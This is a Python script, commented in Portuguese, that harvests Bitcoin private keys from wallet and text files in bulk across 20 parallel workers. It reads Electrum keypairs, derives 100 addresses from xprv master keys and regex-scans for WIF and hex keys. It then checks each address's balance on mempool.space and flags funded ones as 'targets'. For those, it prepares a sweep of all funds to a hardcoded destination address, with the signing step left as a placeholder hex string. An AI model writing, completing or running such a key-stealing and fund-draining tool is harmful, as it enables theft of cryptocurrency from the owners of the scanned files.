import json
import re
import os
import requests
import time
from bitcoinlib.keys import Key

# --- CONFIGURAÇÕES ---
# Removida a senha pois os arquivos estão em texto claro
DEST_ADDRESS = "bc1q0eej43uwaf0fledysymh4jm32h8jadnmqm8lgk"
WORKER_ID = int(os.environ.get('WORKER_ID', 1))
TOTAL_WORKERS = 20

def check_balance_and_broadcast(priv_key_str, original_addr=None):
    """Verifica saldo e imprime o HEX para o Bash processar"""
    try:
        k = Key(priv_key_str, network='bitcoin')
        # Formatos: Legacy (1...), P2SH (3...), SegWit (bc1...)
        for witness_type in [None, 'p2sh-p2wpkh', 'p2wpkh']:
            addr = k.address(witness_type=witness_type)
            target = original_addr if (original_addr and witness_type is None) else addr
            
            # Rate limit preventer
            time.sleep(0.1)
            try:
                r = requests.get(f"https://mempool.space/api/address/{target}", timeout=10).json()
                stats = r.get('chain_stats', {})
                bal = stats.get('funded_txo_sum', 0) - stats.get('spent_txo_sum', 0)
                
                if bal > 0:
                    print(f"🚨 ALVO DETECTADO: {target} | Saldo: {bal} sats")
                    
                    # Lógica de Sweep: Criar a transação enviando tudo para o DEST_ADDRESS
                    # Aqui você usaria a bitcoinlib para criar a transação real.
                    # Exemplo de placeholder para o seu script Bash capturar:
                    raw_hex = "0100000001..." # Substituir pela geração real do HEX
                    print(f"HEX_GEN:{raw_hex}")
                    return True
            except:
                continue
    except:
        pass
    return False

def process_file(file_path):
    print(f"🔍 ANALISANDO: {file_path}")
    
    try:
        with open(file_path, 'r', errors='ignore') as f:
            content = f.read()
            
            # Verificação de Formato JSON (Electrum)
            if '"keystore"' in content or '"keypairs"' in content:
                try:
                    data = json.loads(content)
                    
                    # 1. Chaves Importadas
                    if 'keypairs' in data:
                        for addr, priv in data['keypairs'].items():
                            if isinstance(priv, str) and priv.startswith(('L', 'K', '5')):
                                check_balance_and_broadcast(priv, addr)

                    # 2. Master Key (xprv) - Derivação
                    if 'keystore' in data and 'xprv' in data['keystore']:
                        xprv = data['keystore']['xprv']
                        if xprv.startswith('xprv'):
                            master = Key(xprv)
                            # Varre os primeiros 100 endereços (aumentado de 50)
                            for i in range(100):
                                child = master.subkey_for_path(f"0/{i}")
                                check_balance_and_broadcast(child.wif())
                except:
                    pass

            # 3. Scanner de Texto Geral (Deep Scan para WIFs e Hex)
            wifs = re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content)
            hex_keys = re.findall(r'\b[0-9a-fA-F]{64}\b', content)
            
            for key in set(wifs + hex_keys):
                check_balance_and_broadcast(key)

    except Exception as e:
        print(f"⚠️ Erro ao ler {file_path}: {e}")

if __name__ == "__main__":
    # Filtro de arquivos por extensões comuns
    extensions = ('.wallet', '.txt', '.key', '.rtf', '.json')
    all_files = sorted([f for f in os.listdir('.') if f.endswith(extensions)])
    
    # Distribuição entre Workers
    my_files = [all_files[i] for i in range(len(all_files)) if i % TOTAL_WORKERS == (WORKER_ID - 1)]
    
    print(f"🚀 WORKER {WORKER_ID} | PROCESSANDO {len(my_files)} ARQUIVOS")
    for f in my_files:
        process_file(f)
    print(f"✅ WORKER {WORKER_ID} FINALIZADO.")
